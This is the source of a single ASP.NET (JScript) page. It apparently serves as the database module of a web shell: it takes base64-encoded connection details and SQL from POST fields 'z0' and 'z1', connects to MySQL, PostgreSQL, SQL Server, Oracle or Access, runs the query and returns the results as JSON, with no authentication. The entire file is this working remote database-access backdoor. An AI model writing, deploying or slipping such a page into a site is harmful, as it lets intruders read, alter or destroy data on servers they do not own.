<%

function base64Decode(str) {
    if (!str || str.Trim() == "") return "";
    try {
        var bytes = System.Convert.FromBase64String(str);
        return System.Text.Encoding.UTF8.GetString(bytes);
    } catch(e) { return ""; }
}

function parseDSN(url) {
    var result = new System.Collections.Hashtable();
    if (url.indexOf("://") == -1) {
        throw new System.Exception("Invalid DSN format");
    }

    var p = url.split("://"); 
    var driver = p[0].toLowerCase();
    result.Add("driver", driver);

    var rest = p[1];

    if (driver != "sqlite" && driver != "access") {
        var atPos = rest.indexOf("@");
        var userpass = rest.substring(0, atPos);
        var hostpart = rest.substring(atPos + 1);

        var up = userpass.split(":");
        if (up.length >= 1) result.Add("user", up[0]);
        if (up.length >= 2) result.Add("password", up[1]);

        var hp = hostpart.split("/");
        var hostport = hp[0].split(":");

        result.Add("host", hostport[0]);
        if (hostport.length >= 2) result.Add("port", hostport[1]);
        else result.Add("port", "");

        if (hp.length >= 2) result.Add("database", hp[1]);
        else result.Add("database", "");
    } else {
        result.Add("database", rest);
    }

    return result;
}

function jsonEscape(str) {
    if (!str) return "";
    return str.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r\n", "\\n").Replace("\r", "\\n").Replace("\n", "\\n");
}

function executeQueryOleDb(connStr, sql) {
    var conn = new System.Data.OleDb.OleDbConnection(connStr);
    conn.Open();
    
    var cmd = new System.Data.OleDb.OleDbCommand(sql, conn);
    var reader = cmd.ExecuteReader();
    
    var output = "{\"success\":true,\"rowCount\":-1,\"data\":[";
    var hasRows = false;
    
    while (reader.Read()) {
        hasRows = true;
        output += "{";
        for (var i = 0; i < reader.FieldCount; i++) {
            output += "\"" + reader.GetName(i) + "\":\"" + jsonEscape(reader.GetValue(i).ToString()) + "\"";
            if (i < reader.FieldCount - 1) output += ",";
        }
        output += "},";
    }
    
    if (hasRows) output = output.substring(0, output.length - 1);
    output += "]}";
    
    reader.Close();
    conn.Close();
    return output;
}

function executeQueryOdbc(connStr, sql) {
    var conn = new System.Data.Odbc.OdbcConnection(connStr);
    conn.Open();
    
    var cmd = new System.Data.Odbc.OdbcCommand(sql, conn);
    var reader = cmd.ExecuteReader();
    
    var output = "{\"success\":true,\"rowCount\":-1,\"data\":[";
    var hasRows = false;
    
    while (reader.Read()) {
        hasRows = true;
        output += "{";
        for (var i = 0; i < reader.FieldCount; i++) {
            output += "\"" + reader.GetName(i) + "\":\"" + jsonEscape(reader.GetValue(i).ToString()) + "\"";
            if (i < reader.FieldCount - 1) output += ",";
        }
        output += "},";
    }
    
    if (hasRows) output = output.substring(0, output.length - 1);
    output += "]}";
    
    reader.Close();
    conn.Close();
    return output;
}

Response.Buffer = true;
Response.ContentType = "application/json";

var z0 = Request.Form["z0"] ? Request.Form["z0"] + "" : "";
var z1 = Request.Form["z1"] ? Request.Form["z1"] + "" : "";

var dsn_url = base64Decode(z0);
var sql = base64Decode(z1);

try {
    var cfg = parseDSN(dsn_url);
    var driver = String(cfg["driver"]);
    var connStr = "";
    var isOdbc = false;

    switch (driver) {
        case "mysql":
            connStr = "Driver={MySQL ODBC 8.0 Driver};Server=" + cfg["host"] + ";Database=" + cfg["database"] + ";User=" + cfg["user"] + ";Password=" + cfg["password"] + ";";
            isOdbc = true;
            break;
        case "pgsql":
            connStr = "Driver={PostgreSQL Unicode};Server=" + cfg["host"] + ";Port=" + cfg["port"] + ";Database=" + cfg["database"] + ";Uid=" + cfg["user"] + ";Pwd=" + cfg["password"] + ";";
            isOdbc = true;
            break;
        case "sqlsrv":
            connStr = "Provider=SQLOLEDB;Data Source=" + cfg["host"] + ";Initial Catalog=" + cfg["database"] + ";User ID=" + cfg["user"] + ";Password=" + cfg["password"] + ";";
            break;
        case "sqlite":
            connStr = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" + cfg["database"] + ";";
            break;
        case "access":
            connStr = "Provider=Microsoft.ACE.OLEDB.12.0;Data Source=" + cfg["database"] + ";";
            break;
        case "oracle":
            connStr = "Provider=OraOLEDB.Oracle;Data Source=" + cfg["host"] + ":" + cfg["port"] + "/" + cfg["database"] + ";User Id=" + cfg["user"] + ";Password=" + cfg["password"] + ";";
            break;
        default:
            Response.Write("{\"success\":false,\"error\":\"Unsupported database type\"}");
            throw new System.Exception("STOP");
    }

    if (sql == "") {
        if (isOdbc) {
            var tConn = new System.Data.Odbc.OdbcConnection(connStr);
            tConn.Open(); tConn.Close();
        } else {
            var tConn = new System.Data.OleDb.OleDbConnection(connStr);
            tConn.Open(); tConn.Close();
        }
        Response.Write("{\"success\":true,\"message\":\"Database connection is OK\"}");
    } else {
        var jsonResult = isOdbc ? executeQueryOdbc(connStr, sql) : executeQueryOleDb(connStr, sql);
        Response.Write(jsonResult);
    }

} catch(e) {
    if (e.message != "STOP") {
        Response.Write("{\"success\":false,\"error\":\"" + jsonEscape(e.message) + "\"}");
    }
}

%>